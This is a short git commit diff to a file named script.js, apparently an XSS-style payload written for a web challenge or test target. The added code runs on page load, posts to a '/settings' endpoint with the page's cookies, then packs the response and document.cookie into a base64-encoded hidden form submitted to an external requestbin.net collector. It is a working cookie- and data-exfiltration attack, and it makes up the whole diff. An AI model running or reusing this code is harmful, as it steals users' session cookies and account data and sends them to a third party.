8f2f0a639b52ba893931bde93fa33c9f30b9e0da
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 19:11:36 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,10 @@
-document.getElementById("name").value = "<b>Hello</b>"
-document.getElementsByClassName("btn btn-outline-primary")[0].click()
+
+window.addEventListener('load', function () {
+
+fetch("/settings", {
+    'method': 'POST',
+    'body': 'name=<b>asf</b>&user_id=2&' +document.cookie
+}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(back+document.cookie));f.appendChild(i);document.body.appendChild(f);f.submit();})})
+
+
+   })
